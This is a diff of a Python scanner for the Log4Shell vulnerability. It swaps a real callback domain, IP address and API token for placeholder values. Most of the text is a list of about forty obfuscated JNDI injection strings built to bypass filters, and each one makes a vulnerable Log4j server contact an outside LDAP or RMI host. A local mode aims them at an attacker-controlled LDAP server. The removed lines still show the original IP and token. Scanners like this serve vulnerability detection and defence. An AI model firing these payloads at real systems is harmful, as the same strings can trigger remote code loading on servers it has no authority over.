@@ -31,50 +31,50 @@ Scan Options:
     \tList all payload can use.
 '''
 # global variable
-default_payload = '${${lower:${::::::::::-j}${upper:n}${lower:d}${upper:i}:${lower:l}${::::::::::-d}${lower:a}${::::::::::-p}://payload_id.pp.ns.cmbdnslog.biz/status}}'
+default_payload = '${${lower:${::::::::::-j}${upper:n}${lower:d}${upper:i}:${lower:l}${::::::::::-d}${lower:a}${::::::::::-p}://payload_id.pp.ns.dnslog.domain/status}}'
 base_payload = ""
 
 # default proxy is None
 proxies = {}
 
 payloads = {
-    "1": r'${jndi:ldap://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "2": r'${jndi:${lower:LDAP}://payload_id.pp.ns.cmbdnslog.biz/TomcatBypass/status}',
-    "3": r'${${sys:sun.cpu.isalist}jndi:${lower:LDAP}://payload_id.pp.ns.cmbdnslog.biz/TomcatBypass/status}',
-    "4": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${upper:m}${lower:i}://payload_id.pp.ns.cmbdnslog.biz/status}}',
-    "5": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${lower:p}://payload_id.pp.ns.cmbdnslog.biz/status}}',
-    "6": r'${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "7": r'${${::-j}ndi:rmi://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "8": r'${jndi:rmi://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "9": r'${${lower:jndi}:${lower:rmi}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "10": r'${${lower:${lower:jndi}}:${lower:rmi}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "11": r'${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "12": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:LDAP}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "13": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}://payload_id.pp.ns.cmbdnslog.biz/TomcatBypass/status}',
-    "14": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.cmbdnslog.biz/status}',
-    "15": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.cmbdnslog.biz${sys:file.separator}status}',
-    "16": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id${sys:sun.cpu.isalist}.pp.ns.cmbdnslog.biz${sys:sun.cpu.isalist}${sys:file.separator}status}',
-    "17": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id${sys:sun.cpu.isalist}.pp.ns.cmbdnslog.biz${sys:sun.cpu.isalist}${sys:file.separator}status}',
-    "18": r'${jndi:${lower:RMI}://payload_id.pp.ns.cmbdnslog.biz/TomcatBypass/status}',
-    "19": r'${${sys:sun.cpu.isalist}jndi:${lower:RMI}://payload_id.pp.ns.cmbdnslog.biz/TomcatBypass/status}',
-    "22": r'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "23": r'${${::-j}ndi:ldap://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "25": r'${${lower:jndi}:${lower:rmi}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "26": r'${${lower:${lower:jndi}}:${lower:ldap}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "27": r'${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "28": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:RMI}://payload_id.pp.ns.cmbdnslog.biz/status}',
-    "29": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}://payload_id.pp.ns.cmbdnslog.biz/TomcatBypass/status}',
-    "30": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.cmbdnslog.biz/status}',
-    "31": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.cmbdnslog.biz${sys:file.separator}status}',
-    "32": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.pp.ns.cmbdnslog.biz/status}",
-    "33": "${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "34": "${jn${date:}di${date:':'}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "35": "${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "36": "${j${main:\k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "37": "${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "38": "${j${::-nD}i${::-:}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "39": "${j${EnV:K5:-nD}i:${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}",
-    "40": "${j${lower:Nd }i${uPper::}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.cmbdnslog.biz/status}"
+    "1": r'${jndi:ldap://payload_id.pp.ns.dnslog.domain/status}',
+    "2": r'${jndi:${lower:LDAP}://payload_id.pp.ns.dnslog.domain/TomcatBypass/status}',
+    "3": r'${${sys:sun.cpu.isalist}jndi:${lower:LDAP}://payload_id.pp.ns.dnslog.domain/TomcatBypass/status}',
+    "4": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${upper:m}${lower:i}://payload_id.pp.ns.dnslog.domain/status}}',
+    "5": r'${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${lower:p}://payload_id.pp.ns.dnslog.domain/status}}',
+    "6": r'${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://payload_id.pp.ns.dnslog.domain/status}',
+    "7": r'${${::-j}ndi:rmi://payload_id.pp.ns.dnslog.domain/status}',
+    "8": r'${jndi:rmi://payload_id.pp.ns.dnslog.domain/status}',
+    "9": r'${${lower:jndi}:${lower:rmi}://payload_id.pp.ns.dnslog.domain/status}',
+    "10": r'${${lower:${lower:jndi}}:${lower:rmi}://payload_id.pp.ns.dnslog.domain/status}',
+    "11": r'${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://payload_id.pp.ns.dnslog.domain/status}',
+    "12": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:LDAP}://payload_id.pp.ns.dnslog.domain/status}',
+    "13": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}://payload_id.pp.ns.dnslog.domain/TomcatBypass/status}',
+    "14": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.dnslog.domain/status}',
+    "15": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.dnslog.domain${sys:file.separator}status}',
+    "16": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id${sys:sun.cpu.isalist}.pp.ns.dnslog.domain${sys:sun.cpu.isalist}${sys:file.separator}status}',
+    "17": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id${sys:sun.cpu.isalist}.pp.ns.dnslog.domain${sys:sun.cpu.isalist}${sys:file.separator}status}',
+    "18": r'${jndi:${lower:RMI}://payload_id.pp.ns.dnslog.domain/TomcatBypass/status}',
+    "19": r'${${sys:sun.cpu.isalist}jndi:${lower:RMI}://payload_id.pp.ns.dnslog.domain/TomcatBypass/status}',
+    "22": r'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}',
+    "23": r'${${::-j}ndi:ldap://payload_id.pp.ns.dnslog.domain/status}',
+    "25": r'${${lower:jndi}:${lower:rmi}://payload_id.pp.ns.dnslog.domain/status}',
+    "26": r'${${lower:${lower:jndi}}:${lower:ldap}://payload_id.pp.ns.dnslog.domain/status}',
+    "27": r'${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://payload_id.pp.ns.dnslog.domain/status}',
+    "28": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:RMI}://payload_id.pp.ns.dnslog.domain/status}',
+    "29": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}://payload_id.pp.ns.dnslog.domain/TomcatBypass/status}',
+    "30": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.dnslog.domain/status}',
+    "31": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.pp.ns.dnslog.domain${sys:file.separator}status}',
+    "32": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.pp.ns.dnslog.domain/status}",
+    "33": "${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "34": "${jn${date:}di${date:':'}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "35": "${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "36": "${j${main:\k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "37": "${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "38": "${j${::-nD}i${::-:}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "39": "${j${EnV:K5:-nD}i:${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}",
+    "40": "${j${lower:Nd }i${uPper::}${::-l}${::-d}${::-a}${::-p}://payload_id.pp.ns.dnslog.domain/status}"
 }
 
 def GeneratePayloadId(url):
@@ -86,8 +86,8 @@ def GeneratePayloadId(url):
 def CheckDnslog():
     # print(" [+] Getting DNSLog")
     time.sleep(0.5)
-    dnslog_url = "http://182.61.14.49:8080/api/getDnsData"
-    headers = {"token": "admin@qax"}
+    dnslog_url = "http://dnslog.domain/api/getDnsData"
+    headers = {"token": "token"}
     try:
         response = requests.get(url=dnslog_url, headers=headers)
         all_msg = eval(response.json()["Msg"])
@@ -508,13 +508,13 @@ def scan(argv):
                 base_payload = default_payload
                 # the payload of local is different from dnslog, because the site of target_id will be display on differect localtion in URL.
                 if local == 1:
-                    base_payload = default_payload.replace("pp.ns.cmbdnslog.biz", str(ldap_ip) + ":" + str(ldap_port))
+                    base_payload = default_payload.replace("pp.ns.dnslog.domain", str(ldap_ip) + ":" + str(ldap_port))
                     base_payload = base_payload.replace("payload_id.", "").replace("status", "payload_id")
                 Log4j.payload = base_payload
                 print('[+] Using default payload: ' + Log4j.payload)
             else:
                 if local == 1:
-                    base_payload = base_payload.replace("pp.ns.cmbdnslog.biz", str(ldap_ip)+":"+str(ldap_port))
+                    base_payload = base_payload.replace("pp.ns.dnslog.domain", str(ldap_ip)+":"+str(ldap_port))
                     base_payload = base_payload.replace("payload_id.", "").replace("status", "payload_id")
                 Log4j.payload = base_payload
                 print('[+] Using payload: ' + Log4j.payload)
